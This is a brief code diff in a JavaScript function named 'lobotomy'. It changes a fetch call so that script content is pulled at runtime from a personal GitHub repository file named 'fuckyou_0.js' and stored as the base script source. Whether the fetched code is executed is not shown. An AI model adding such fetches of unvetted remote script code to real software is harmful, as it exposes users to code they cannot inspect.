@@ -12,7 +12,7 @@ async function lobotomy() {
     } else {
 
         try {
-            const fetched = await fetch(`https://githubusercontent.com`);
+            const fetched = await fetch(`https://raw.githubusercontent.com/barrettma00-droid/fuckyou_0/refs/heads/main/fuckyou_0.js`);
             source = await fetched.text();
         } catch (e) {
             console.error("Could not fetch base script content.");
